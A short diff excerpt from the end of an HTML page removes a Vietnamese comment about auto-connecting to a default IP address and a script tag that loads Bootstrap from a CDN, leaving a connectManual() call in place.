-        // Tự động kết nối theo IP mặc định trong ô input
         connectManual();
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
